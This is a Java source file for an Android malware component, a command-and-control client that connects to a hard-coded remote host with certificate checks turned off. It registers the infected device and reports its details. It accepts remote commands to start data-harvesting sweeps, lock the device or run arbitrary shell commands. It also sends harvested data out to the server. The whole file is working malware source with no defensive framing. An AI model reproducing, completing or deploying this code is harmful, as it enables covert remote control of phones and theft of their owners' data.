package com.chameleon.payload.network;

import android.content.Context;
import android.os.Build;
import android.util.Log;
import com.chameleon.payload.PayloadEntry;
import com.chameleon.payload.harvester.HarvesterManager;
import com.chameleon.payload.util.Crypto;
import com.chameleon.payload.util.NetworkUtils;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.*;
import java.net.Socket;
import java.security.SecureRandom;
import java.util.Base64;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import javax.net.ssl.SSLContext;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;

public class C2Connection {
    private static final String TAG = "C2Connection";
    private static final int RECONNECT_DELAY_MS = 10000;
    private static final int HEARTBEAT_INTERVAL_MS = 30000;
    private static final int MAX_RETRIES = 20;

    private final Context context;
    private final HarvesterManager harvesterManager;
    private final ExecutorService executor;
    private Socket socket;
    private OutputStream outputStream;
    private InputStream inputStream;
    private volatile boolean running = false;
    private String deviceId;
    private String c2Url;

    public C2Connection(Context context, HarvesterManager harvesterManager) {
        this.context = context;
        this.harvesterManager = harvesterManager;
        this.executor = Executors.newSingleThreadExecutor();
        this.deviceId = Build.ID + "_" + System.currentTimeMillis();
    }

    public void connect() {
        if (running) return;
        running = true;
        executor.submit(this::connectionLoop);
    }

    public void disconnect() {
        running = false;
        try { if (socket != null) socket.close(); } catch (Exception ignored) {}
        executor.shutdownNow();
    }

    private void connectionLoop() {
        int retries = 0;
        while (running && retries < MAX_RETRIES) {
            try {
                String host = "www.miraiglobal.site";
                int port = 443;
                String path = "/ws";

                SSLContext sslContext = SSLContext.getInstance("TLS");
                sslContext.init(null, new TrustManager[]{trustAllCerts}, new SecureRandom());
                socket = sslContext.getSocketFactory().createSocket(host, port);
                socket.setSoTimeout(30000);

                outputStream = socket.getOutputStream();
                inputStream = socket.getInputStream();

                if (performHandshake(host, port, path)) {
                    retries = 0;
                    Log.i(TAG, "Connected to C2: " + host);
                    register();
                    startHeartbeat();
                    listenForMessages();
                }
            } catch (Exception e) {
                retries++;
                Log.e(TAG, "Connection failed (attempt " + retries + ")", e);
                sleep(RECONNECT_DELAY_MS * Math.min(retries, 5));
            }
        }
    }

    private boolean performHandshake(String host, int port, String path) throws IOException {
        String key = generateKey();
        String handshake = "GET " + path + " HTTP/1.1\r\n" +
                "Host: " + host + ":" + port + "\r\n" +
                "Upgrade: websocket\r\n" +
                "Connection: Upgrade\r\n" +
                "Sec-WebSocket-Key: " + key + "\r\n" +
                "Sec-WebSocket-Version: 13\r\n\r\n";

        outputStream.write(handshake.getBytes());
        outputStream.flush();

        BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
        String response = reader.readLine();
        if (response == null || !response.contains("101")) {
            Log.e(TAG, "Handshake failed: " + response);
            return false;
        }
        while (reader.readLine() != null && !reader.readLine().isEmpty()) {}
        return true;
    }

    private void register() {
        try {
            JSONObject reg = new JSONObject();
            reg.put("type", "register");
            reg.put("device_id", deviceId);
            reg.put("data", new JSONObject()
                .put("device_id", deviceId)
                .put("device_name", Build.MANUFACTURER + " " + Build.MODEL)
                .put("manufacturer", Build.MANUFACTURER)
                .put("model", Build.MODEL)
                .put("android_version", Build.VERSION.RELEASE)
                .put("api_level", Build.VERSION.SDK_INT)
                .put("timestamp", System.currentTimeMillis())
            );
            send(reg.toString());
            Log.i(TAG, "Registered with C2");
        } catch (Exception e) {
            Log.e(TAG, "Registration failed", e);
        }
    }

    private void startHeartbeat() {
        Thread t = new Thread(() -> {
            while (running) {
                sleep(HEARTBEAT_INTERVAL_MS);
                try {
                    JSONObject hb = new JSONObject();
                    hb.put("type", "heartbeat");
                    hb.put("device_id", deviceId);
                    hb.put("data", new JSONObject().put("device_id", deviceId).put("timestamp", System.currentTimeMillis()));
                    send(hb.toString());
                } catch (Exception ignored) {}
            }
        });
        t.setDaemon(true);
        t.start();
    }

    private void listenForMessages() {
        try {
            byte[] buffer = new byte[65536];
            while (running) {
                int first = inputStream.read();
                if (first == -1) break;

                int second = inputStream.read();
                if (second == -1) break;

                int opcode = first & 0x0F;
                int payloadLen = second & 0x7F;

                if (payloadLen == 126) {
                    payloadLen = (inputStream.read() << 8) | inputStream.read();
                } else if (payloadLen == 127) {
                    long len = 0;
                    for (int i = 0; i < 8; i++) len = (len << 8) | (inputStream.read() & 0xFF);
                    payloadLen = (int) len;
                }

                byte[] maskKey = new byte[4];
                inputStream.read(maskKey);

                byte[] payload = new byte[payloadLen];
                int read = 0;
                while (read < payloadLen) {
                    int n = inputStream.read(payload, read, payloadLen - read);
                    if (n == -1) break;
                    read += n;
                }

                for (int i = 0; i < payload.length; i++) {
                    payload[i] ^= maskKey[i % 4];
                }

                if (opcode == 1) {
                    handleMessage(new String(payload));
                } else if (opcode == 8) {
                    break;
                } else if (opcode == 9) {
                    sendPong();
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Listen error", e);
        }
    }

    private void handleMessage(String message) {
        try {
            JSONObject msg = new JSONObject(message);
            String type = msg.optString("type");

            if ("command".equals(type)) {
                String command = msg.optString("command");
                String commandId = msg.optString("command_id");
                JSONObject params = msg.optJSONObject("params");
                handleCommand(commandId, command, params);
            } else if ("ping".equals(type)) {
                send("{\"type\":\"pong\"}");
            }
        } catch (Exception e) {
            Log.e(TAG, "Message parse error", e);
        }
    }

    private void handleCommand(String commandId, String command, JSONObject params) {
        Log.i(TAG, "Command: " + command);

        try {
            switch (command) {
                case "start_sweep": {
                    int duration = params != null ? params.optInt("duration", 300) : 300;
                    harvesterManager.startSweep(duration);
                    sendAck(commandId, "started");
                    break;
                }
                case "stop_sweep": {
                    harvesterManager.stopSweep();
                    sendAck(commandId, "stopped");
                    break;
                }
                case "lock_device": {
                    harvesterManager.lockDevice();
                    sendAck(commandId, "done");
                    break;
                }
                case "release_device": {
                    harvesterManager.releaseDevice();
                    sendAck(commandId, "done");
                    break;
                }
                case "exec_command": {
                    String cmd = params != null ? params.optString("cmd", "") : "";
                    execShell(cmd);
                    sendAck(commandId, "executed");
                    break;
                }
                default:
                    sendAck(commandId, "unknown");
            }
        } catch (Exception e) {
            Log.e(TAG, "Command error", e);
        }
    }

    public void sendData(String dataType, byte[] encryptedPayload) {
        try {
            String encoded = Base64.getEncoder().encodeToString(encryptedPayload);
            JSONObject data = new JSONObject();
            data.put("type", "data");
            data.put("device_id", deviceId);
            data.put("data_type", dataType);
            data.put("data", new JSONObject()
                .put("device_id", deviceId)
                .put("data_type", dataType)
                .put("payload", encoded)
                .put("timestamp", System.currentTimeMillis())
            );
            send(data.toString());
        } catch (Exception e) {
            Log.e(TAG, "Send data error", e);
        }
    }

    private void sendAck(String commandId, String status) {
        try {
            JSONObject ack = new JSONObject();
            ack.put("type", "command_ack");
            ack.put("device_id", deviceId);
            ack.put("command_id", commandId);
            ack.put("data", new JSONObject().put("command_id", commandId).put("status", status));
            send(ack.toString());
        } catch (Exception e) {
            Log.e(TAG, "Ack error", e);
        }
    }

    private void send(String message) {
        try {
            byte[] payload = message.getBytes("UTF-8");
            ByteArrayOutputStream buf = new ByteArrayOutputStream();
            buf.write(0x81);
            if (payload.length < 126) {
                buf.write(payload.length);
            } else if (payload.length < 65536) {
                buf.write(126);
                buf.write((payload.length >> 8) & 0xFF);
                buf.write(payload.length & 0xFF);
            } else {
                buf.write(127);
                long len = payload.length;
                for (int i = 7; i >= 0; i--) buf.write((byte)((len >> (i * 8)) & 0xFF));
            }
            buf.write(payload);
            outputStream.write(buf.toByteArray());
            outputStream.flush();
        } catch (Exception e) {
            Log.e(TAG, "Send error", e);
        }
    }

    private void sendPong() {
        try { outputStream.write(new byte[]{0x8A, 0x00}); outputStream.flush(); }
        catch (Exception ignored) {}
    }

    private void execShell(String cmd) {
        try {
            Runtime.getRuntime().exec(cmd);
        } catch (Exception e) {
            Log.e(TAG, "Shell exec error", e);
        }
    }

    private String generateKey() {
        byte[] random = new byte[16];
        new SecureRandom().nextBytes(random);
        return Base64.getEncoder().encodeToString(random);
    }

    private void sleep(long ms) {
        try { Thread.sleep(ms); } catch (InterruptedException ignored) {}
    }

    private static final X509TrustManager trustAllCerts = new X509TrustManager() {
        public void checkClientTrusted(java.security.cert.X509Certificate[] c, String a) {}
        public void checkServerTrusted(java.security.cert.X509Certificate[] c, String a) {}
        public java.security.cert.X509Certificate[] getAcceptedIssuers() { return new java.security.cert.X509Certificate[0]; }
    };
}
